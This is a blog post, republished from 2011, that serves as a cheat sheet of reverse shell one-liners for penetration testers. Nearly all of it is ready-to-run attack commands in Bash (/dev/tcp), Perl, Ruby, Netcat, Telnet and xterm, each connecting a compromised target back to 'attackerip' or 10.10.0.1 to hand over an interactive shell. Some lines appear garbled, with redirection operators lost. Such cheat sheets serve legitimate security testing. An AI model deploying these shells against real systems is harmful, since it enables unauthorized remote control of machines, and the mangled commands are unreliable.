From [Bernardo Dag](https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html) / https://bernardodamele.blogspot.com/2011/09/reverse-shells-one-liners.html

# Reverse shells one-liners
Inspired by the great blog post by pentestmonkey.net, I put together the following extra methods and alternatives for some methods explained in the cheat sheet. There is nothing cutting edge, however you may find this handy during your penetration tests.

Citing pentestmonkey's blog post:
If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.
[...] **your next step is likely to be either throwing back a reverse shell** or binding a shell to a TCP port.
Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.


💡💡💡  First of all, on your machine, set up a listener, where **`attackerip`** is your IP address and **`4444`** is an arbitrary TCP port unfiltered by the target's firewall:
```bash
nc -lv attackerip 4444
```

## Bash
Alternatives for **Bash** shell:
```bash
exec /bin/bash 0&0 2>&0
```
Or:
```bash
0<&196;exec 196<>/dev/tcp/attackerip/4444; sh <&196 >&196 2>&196
```
Or:
```bash
exec 5<>/dev/tcp/10.10.0.1/8888;cat <&5 | while read line; do $line 2>&5 >&5; done
```
or:
```bash
exec 5<>/dev/tcp/10.10.0.1/8888; while read line 0<&5; do $line 2>&5 >&5; done
```

See also [Reverse Shell With Bash](http://www.gnucitizen.org/blog/reverse-shell-with-bash/) / http://www.gnucitizen.org/blog/reverse-shell-with-bash/ from GNUCITIZEN blog.

## Perl

Shorter **Perl** reverse shell that does not depend on `/bin/sh`:
```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
*If the target system is running Windows use the following one-liner:*
```bash
perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"attackerip:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby
Longer **Ruby** reverse shell that does not depend on `/bin/sh`:
```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
If the target system is running Windows use the following one-liner:
```bash
ruby -rsocket -e 'c=TCPSocket.new("attackerip","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## Netcat

Others possible **Netcat** reverse shells, depending on the Netcat version and compilation flags:
```bash
nc -c /bin/sh attackerip 4444
```
Or:
```bash
/bin/sh | nc attackerip 4444
```
Or:
```bash
rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p
```
See also [7 Linux Shells Using Built-in Tools](http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/) / http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/ from LaNMaSteR53 blog.

## Telnet

Of course, you can also use **Telnet** as an alternative for Netcat:
```bash
rm -f /tmp/p; mknod /tmp/p p && telnet attackerip 4444 0/tmp/p
```
Or:
```bash
telnet attackerip 4444 | /bin/bash | telnet attackerip 4445   #⚠️ Remember to listen on your machine also on port 4445/tcp
```

## xterm
Follows further details on **xterm** reverse shell:

To catch incoming xterm, start an open X Server on your system (:1 - which listens on TCP port 6001). One way to do this is with [Xnest](http://www.xfree86.org/4.4.0/Xnest.1.html) / http://www.xfree86.org/4.4.0/Xnest.1.html:
```bash
Xnest :1
```
⚠️ Then remember to authorise on your system the target IP to connect to you:
```bash
xterm -display 127.0.0.1:1  # Run this OUTSIDE the Xnest
xhost +targetip             # Run this INSIDE the spawned xterm on the open X Server
```
Then on the target, assuming that `xterm` is installed, connect back to the open X Server on your system:
```bash
xterm -display attackerip:1
```
Or:
```bash
$ DISPLAY=attackerip:0 xterm
```
It will try to connect back to you, `attackerip`, on TCP port `6001`.

Note that on Solaris xterm path is usually not within the `PATH` environment variable, you need to specify its filepath:
```bash
/usr/openwin/bin/xterm -display attackerip:1
```
